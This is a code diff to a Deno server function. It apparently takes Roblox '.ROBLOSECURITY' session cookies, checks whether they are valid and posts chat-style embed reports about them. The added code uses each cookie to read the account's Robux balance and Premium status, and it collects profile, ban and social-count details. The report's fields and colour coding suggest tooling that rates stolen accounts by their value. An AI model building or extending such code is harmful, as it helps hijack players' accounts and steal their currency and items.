@@ -73,7 +73,7 @@ Deno.serve(async (req) => {
       }
     }
 
-    // Fetch top 3 favorite/current games for the account
+    // Fetch top 3 favorite games
     let topGames: string[] = [];
     if (userId) {
       try {
@@ -91,15 +91,64 @@ Deno.serve(async (req) => {
       }
     }
 
+    // Profile + economy + social summary
+    let displayName: string | null = null;
+    let createdAt: string | null = null;
+    let description: string | null = null;
+    let isBanned = false;
+    let robux: number | null = null;
+    let isPremium: boolean | null = null;
+    let friendsCount: number | null = null;
+    let followersCount: number | null = null;
+    let followingCount: number | null = null;
+    if (userId) {
+      const ch = cookie ? { Cookie: `.ROBLOSECURITY=${cookie}` } : {};
+      await Promise.all([
+        fetch(`https://users.roblox.com/v1/users/${userId}`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); displayName = j?.displayName ?? null; createdAt = j?.created ?? null; description = typeof j?.description === "string" ? j.description : null; isBanned = !!j?.isBanned; }
+        }).catch(() => {}),
+        fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: ch }).then(async (r) => {
+          if (r.ok) { const j = await r.json(); robux = typeof j?.robux === "number" ? j.robux : null; }
+        }).catch(() => {}),
+        fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: ch }).then(async (r) => {
+          if (r.ok) { isPremium = (await r.text()).trim() === "true"; }
+        }).catch(() => {}),
+        fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); friendsCount = j?.count ?? null; }
+        }).catch(() => {}),
+        fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); followersCount = j?.count ?? null; }
+        }).catch(() => {}),
+        fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`).then(async (r) => {
+          if (r.ok) { const j = await r.json(); followingCount = j?.count ?? null; }
+        }).catch(() => {}),
+      ]);
+    }
+
+    const profileUrl = userId ? `https://www.roblox.com/users/${userId}/profile` : null;
+    const usernameValue = username
+      ? (profileUrl ? `[${username}](${profileUrl})${displayName && displayName !== username ? ` — ${displayName}` : ""}` : username)
+      : "Unknown";
+
     const color = cookieValid === false ? 0xef4444 : (status === "COMPLETE" ? 0x22c55e : 0x3b82f6);
     const validityLabel = cookieValid === true ? "✅ Valid" : cookieValid === false ? "❌ Invalid" : "❓ Unknown";
     const fields: { name: string; value: string; inline?: boolean }[] = [
       { name: "Version", value: version.toUpperCase(), inline: true },
       { name: "Status", value: status, inline: true },
       { name: "Cookie", value: validityLabel, inline: true },
-      { name: "Username", value: username || "Unknown", inline: true },
+      { name: "Username", value: usernameValue, inline: false },
+      { name: "Robux", value: robux !== null ? `R$ ${robux.toLocaleString()}` : "—", inline: true },
+      { name: "Premium", value: isPremium === null ? "—" : isPremium ? "✅ Yes" : "❌ No", inline: true },
+      { name: "Created", value: createdAt ? `<t:${Math.floor(new Date(createdAt).getTime() / 1000)}:D>` : "—", inline: true },
+      { name: "Friends", value: friendsCount !== null ? String(friendsCount) : "—", inline: true },
+      { name: "Followers", value: followersCount !== null ? String(followersCount) : "—", inline: true },
+      { name: "Following", value: followingCount !== null ? String(followingCount) : "—", inline: true },
+      { name: "Banned", value: isBanned ? "🚫 Yes" : "No", inline: true },
       { name: "Top Games", value: topGames.length ? topGames.join(" | ") : "None", inline: false },
     ];
+    if (description) {
+      fields.push({ name: "Description", value: description.slice(0, 500), inline: false });
+    }
     if (durationMs !== null) {
       fields.push({ name: "Duration", value: `${(durationMs / 1000).toFixed(1)}s`, inline: true });
     }
